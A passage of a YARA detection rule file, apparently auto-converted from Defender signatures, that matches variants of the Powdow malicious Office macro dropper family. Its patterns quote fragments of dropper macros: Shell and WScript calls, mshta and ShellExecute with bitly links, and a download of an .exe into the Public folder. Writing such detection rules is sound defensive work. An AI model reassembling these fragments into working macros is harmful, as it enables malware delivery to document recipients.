        $x_1_2 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 4d 61 6e 61 67 65 72 22 29 2e 56 61 6c 75 65 [0-32] 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-21] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {54 72 69 6d 28 [0-32] 29 02 00 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 02 00 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 23 29 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_5 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 02 00 73 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCD_2147796870_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCD!MTB"
        threat_id = "2147796870"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 [0-32] 22 29 2e 56 61 6c 75 65 [0-32] 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 02 00 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 25 35 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_5 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 02 00 73 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6c 6f 6b 6b 6f 6f 6b 61 2e 63 6f 70 79 66 69 6c 65 20 4f 69 77 61 2c 20 45 6e 76 69 72 6f 6e 24 28 22 50 55 42 4c 49 43 22 29 20 26 20 22 5c 6b 22 20 2b 20 22 6f 6f 2e 63 6f 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 6d 22 29 2c 20 54 72 75 65 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "Lokkoummzddd = Join(Pooarokskzasd, \"\")" ascii //weight: 1
        $x_1_3 = "Shell (lakakaka)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-37] 28 22 35 37 35 33 22 29 20 26 20 01 28 22 36 33 37 32 36 39 37 30 37 34 32 65 35 33 36 38 36 35 36 63 36 63 22 29 29 [0-3] 00 2e 52 75 6e 20 28 63 6d 64 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "cmd = cmd0 & cmd1 & cmd2" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-15] 2c 20 [0-15] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 30 2c 20 53 74 72 43 6f 6e 76 28 22 6f 70 65 6e 22 2c 20 [0-4] 29 2c 20 53 74 72 43 6f 6e 76 28 22 65 78 70 6c 6f 72 65 72 22 2c 20 [0-4] 29 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 2e 63 6d 7a 22 2c 20 22 2e 63 6d 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f [0-80] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 01 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"C:\\Users\\Public\\dssdd.cmzd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Call obj.Janug.ShellExecute(k1.u1.ControlTipText, \"https://bitly.com/etywuiqdhbsgjj\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 53 74 72 52 65 76 65 72 73 65 20 5f [0-3] 28 22 30 22 20 2b 20 22 30 22 20 2b 20 22 30 22 20 2b 20 22 30 22 20 2b 20 22 34 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {22 36 22 20 2b 20 22 39 22 20 2b 20 22 30 22 20 2b 20 22 37 22 20 2b 20 22 33 22 20 2b 20 22 31 22 20 2b 20 22 3a 22 20 2b 20 22 77 22 20 2b 20 22 65 22 20 2b 20 22 6e 22 29 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 22 [0-3] 53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Debug.Print MsgBox(\"ERROR!\", vbOKCancel); returns; 1" ascii //weight: 1
        $x_1_3 = {58 20 3d 20 22 6d 73 68 74 61 2e 65 78 65 20 22 [0-3] 59 20 3d 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 22 [0-3] 5a 20 3d 20 22 [0-37] 22 [0-3] 44 65 62 75 67 2e 50 72 69 6e 74 20 58}  //weight: 1, accuracy: Low
        $x_1_4 = {44 65 62 75 67 2e 50 72 69 6e 74 20 59 [0-3] 44 65 62 75 67 2e 50 72 69 6e 74 20 5a [0-3] 44 65 62 75 67 2e 50 72 69 6e 74 20 28 53 68 65 6c 6c 28 58 20 2b 20 59 20 2b 20 5a 29 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 73 67 42 6f 78 20 22 4f 75 74 64 61 74 65 64 20 4f 66 66 69 63 65 20 56 65 72 73 69 6f 6e 22 [0-3] 41 63 74 69 76 65 53 68 65 65 74 2e 50 72 69 6e 74 4f 75 74}  //weight: 1, accuracy: Low
        $x_1_2 = "Iueoap = Split(Kongkao, \"Hkadhiena\")" ascii //weight: 1
        $x_1_3 = "Kongkao = Sheets(\"Sheet1\").Cells(1151, 51).Value" ascii //weight: 1
        $x_1_4 = "Sunwaye = \"Mid Function j.m\"" ascii //weight: 1
        $x_1_5 = "LastWord = Mid(Sunwaye, 14, 4) & String(1, \"p\")" ascii //weight: 1
        $x_1_6 = {4e 4f 6b 75 65 33 20 3d 20 4c 61 73 74 57 6f 72 64 20 2b 20 22 2f 22 20 2b 20 22 [0-32] 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 [0-15] 22 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = "ActiveDocument.Content.Find.Execute FindText:=\"%5\", ReplaceWith:=" ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c [0-3] 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 02 00 73 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_SS_2147796933_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.SS!MTB"
        threat_id = "2147796933"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c [0-3] 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 [0-3] 73 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 [0-3] 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 23 29 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d}  //weight: 1, accuracy: Low
        $x_1_5 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 [0-15] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RVA_2147798000_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RVA!MTB"
        threat_id = "2147798000"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 65 78 65 63 20 22 65 78 70 6c 6f 72 65 72 2e 65 78 65 20 22 20 26 20 [0-20] 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 22 20 2b 20 [0-20] 20 2b 20 22 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".BuiltInDocumentProperties(\"keywords\").Value" ascii //weight: 1
        $x_1_4 = "ActiveDocument.Content.Find.Execute FindText:=\"_f\"" ascii //weight: 1
        $x_1_5 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 0d 0a 6d 61 69 6e 2e 6b 61 72 6f 6c 69 6e 65 20 28 22 22 29}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCH_2147798079_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCH!MTB"
        threat_id = "2147798079"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 6b 65 79 77 6f 72 64 73 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 02 00 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 [0-32] 2c 20 22 69 70 74 22 2c 20 22 6c 6f 72 65 72 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 6b 65 79 77 6f 72 64 73 22 29 2e 56 61 6c 75 65 02 00 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 5f 66 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d [0-32] 2c 20 52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 22 20 2b 20 [0-32] 20 2b 20 22 2e 73 68 65 6c 6c 22 29 [0-32] 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 22 20 26 20 [0-32] 20 26 20 22 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCI_2147798154_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCI!MTB"
        threat_id = "2147798154"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 6b 65 79 77 6f 72 64 73 02 00 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 02 00 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d [0-3] 45 6e 64 20 57 69 74 68 02 00 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 [0-32] 2c 20 22 72 65 72 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 6b 65 79 77 6f 72 64 73 22 29 2e 56 61 6c 75 65 02 00 45 6e 64 20 57 69 74 68 02 00 6b 65 79 77 6f 72 64 73 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 5f 66 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d [0-32] 2c 20 52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 [0-32] 2e 65 78 65 63 20 22 65 78 70 6c 6f 22 20 26 20 [0-32] 20 26 20 22 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCJ_2147798340_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCJ!MTB"
        threat_id = "2147798340"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 6b 65 79 77 6f 72 64 73 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d [0-32] 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 [0-32] 2c 20 22 69 70 74 2e 73 68 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 6b 65 79 77 6f 72 64 73 22 29 2e 56 61 6c 75 65 02 00 45 6e 64 20 57 69 74 68 02 00 6b 65 79 77 6f 72 64 73 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 5f 66 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d [0-32] 2c 20 52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 22 20 2b 20 [0-32] 20 2b 20 22 65 6c 6c 22 29 [0-32] 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCK_2147798445_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCK!MTB"
        threat_id = "2147798445"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6b 61 72 6f 6c 69 6e 65 28 [0-32] 29 [0-32] 20 3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-32] 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 02 00 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 6b 65 79 77 6f 72 64 73 22 29 2e 56 61 6c 75 65 02 00 45 6e 64 20 57 69 74 68 02 00 6b 65 79 77 6f 72 64 73 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 24 31 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d [0-32] 2c 20 52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 [0-32] 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCL_2147798469_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCL!MTB"
        threat_id = "2147798469"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6b 61 72 6f 6c 69 6e 65 28 [0-32] 29 [0-32] 20 3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-32] 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 02 00 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 [0-32] 2e 65 78 65 63 20 22 65 78 70 6c 6f 22 20 26 20 [0-32] 20 26 20 22 65 22 20 26 20 [0-32] 20 26 20 22 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 6d 61 69 6e 2e 6b 61 72 6f 6c 69 6e 65 20 28 22 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCL_2147798469_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCL!MTB"
        threat_id = "2147798469"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
